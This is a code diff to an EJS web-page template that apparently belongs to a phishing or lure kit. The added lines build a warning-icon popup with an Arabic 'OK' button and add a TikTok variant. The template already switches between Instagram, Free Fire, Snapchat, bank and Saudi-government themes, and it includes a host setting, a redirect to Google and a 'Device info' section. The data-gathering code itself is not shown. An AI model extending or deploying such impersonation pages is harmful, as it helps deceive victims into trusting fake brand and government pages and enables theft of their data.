@@ -153,9 +153,51 @@ body{
   gap:6px;font-size:11px;color:rgba(255,255,255,0.3);
   margin-top:18px;
 }
+/* ── Welcome popup ── */
+#welcomeOverlay{
+  position:fixed;inset:0;z-index:9999;
+  background:rgba(0,0,0,0.82);
+  display:flex;align-items:center;justify-content:center;
+  backdrop-filter:blur(4px);
+  animation:fadeIn .35s ease;
+}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+#welcomeBox{
+  background:rgba(30,30,40,0.97);
+  border:1px solid rgba(255,255,255,0.15);
+  border-radius:20px;
+  padding:32px 24px;
+  max-width:340px;
+  width:90%;
+  text-align:center;
+  box-shadow:0 24px 60px rgba(0,0,0,0.6);
+}
+#welcomeIcon{font-size:48px;margin-bottom:12px}
+#welcomeText{
+  font-size:16px;line-height:1.7;
+  color:#fff;font-weight:500;
+  margin-bottom:24px;white-space:pre-line;
+}
+#welcomeBtn{
+  background:<%= cfg.btnColor %>;
+  color:#fff;border:none;border-radius:12px;
+  padding:12px 32px;font-size:15px;font-weight:700;
+  cursor:pointer;width:100%;
+}
+#welcomeBtn:hover{opacity:.88}
 </style>
 </head>
 <body>
+
+<% if(cfg.welcomeEnabled && cfg.welcomeMsg){ %>
+<div id="welcomeOverlay">
+  <div id="welcomeBox">
+    <div id="welcomeIcon">⚠️</div>
+    <div id="welcomeText"><%= cfg.welcomeMsg %></div>
+    <button id="welcomeBtn" onclick="closeWelcome()">حسناً</button>
+  </div>
+</div>
+<% } %>
 
 <div class="card">
 
@@ -167,6 +209,7 @@ body{
     <% } else if(cfg.template==='ig')   { %> 📸
     <% } else if(cfg.template==='ff')   { %> 🔥
     <% } else if(cfg.template==='snap') { %> 👻
+    <% } else if(cfg.template==='tt')   { %> 🎵
     <% } else if(cfg.template==='bank') { %> 🏦
     <% } else if(cfg.template==='gov')  { %> 🇸🇦
     <% } else { %> 🎁
@@ -232,6 +275,13 @@ body{
 <script>
 const HOST = '<%= host %>';
 const REDIRECT = '<%= cfg.redirect || "https://www.google.com" %>';
+
+// ── Welcome popup ─────────────────────────────────────────────────────────────
+function closeWelcome(){
+  var el = document.getElementById('welcomeOverlay');
+  if(el){ el.style.transition='opacity .25s'; el.style.opacity='0'; setTimeout(function(){el.remove();},260); }
+}
+
 const TIMER_MIN = <%= cfg.timer || 0 %>;
 
 // ── Device info ─────────────────────────────────────────────────────────────
